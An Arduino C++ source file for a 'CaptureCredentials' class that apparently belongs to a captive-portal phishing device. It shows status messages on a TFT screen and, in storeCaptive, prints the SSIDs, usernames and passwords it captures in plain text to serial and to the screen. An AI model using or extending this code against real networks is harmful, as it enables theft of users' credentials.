#include <Arduino.h>
#include <CaptureCredentials.h>
#include <string>

#include <Adafruit_GFX.h>
#include <Adafruit_ILI9341.h>

#define TFT_CLK 18
#define TFT_MISO 12
#define TFT_MOSI 23
#define TFT_CS 27
#define TFT_DC 32
#define TFT_RST 5

Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);

CaptureCredentials::CaptureCredentials()
{
    tft.begin();
    tft.fillScreen(ILI9341_BLACK); // Clear the screen
    tft.setTextColor(ILI9341_WHITE);
}

void CaptureCredentials::initScreen()
{
    tft.begin();
    tft.fillScreen(ILI9341_BLACK); // Clear the screen
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(2);
    tft.setCursor(0, 0); // Set the cursor to the top left corner
    tft.println("Waiting for captures on the captive portal.");
}

void CaptureCredentials::offScren()
{
    tft.fillScreen(ILI9341_BLACK);   // Clear the screen
    tft.setCursor(0, 0);             // Set the cursor to the top left corner
    tft.setTextColor(ILI9341_WHITE); // Set the text color to white
    tft.setTextSize(2);

    tft.println("Portal is off. Not storing.");
}

void CaptureCredentials::storeCaptive(String ssid, String portalId, String username, String password)
{
    Serial.println("Storing captive portal credentials");
    Serial.println("SSID: " + ssid);
    Serial.println("PortalID: " + portalId);
    Serial.println();
    Serial.println("username: " + username);
    Serial.println("password: " + password);

    tft.fillScreen(ILI9341_BLACK);   // Clear the screen
    tft.setCursor(0, 0);             // Set the cursor to the top left corner
    tft.setTextColor(ILI9341_WHITE); // Set the text color to white
    tft.println("Storing captive portal credentials");
    tft.println("SSID: " + ssid);
    tft.println("PortalID: " + portalId);
    tft.println();
    tft.println("username: " + username);
    tft.println("password: " + password);
};